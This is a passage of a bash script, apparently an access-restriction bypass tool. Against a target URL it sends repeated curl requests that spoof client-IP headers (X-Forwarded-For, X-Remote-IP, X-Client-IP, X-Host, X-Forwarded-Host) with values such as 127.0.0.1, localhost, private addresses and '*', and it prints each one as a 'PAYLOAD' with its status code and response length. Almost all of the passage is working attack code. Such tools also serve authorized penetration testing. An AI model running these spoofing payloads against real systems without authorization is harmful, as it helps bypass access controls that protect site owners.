	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Remote-IP Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-IP Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-IP: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Client-IP Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Client-IP Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Client-IP: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Host Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Host: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Forwarded-Host Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

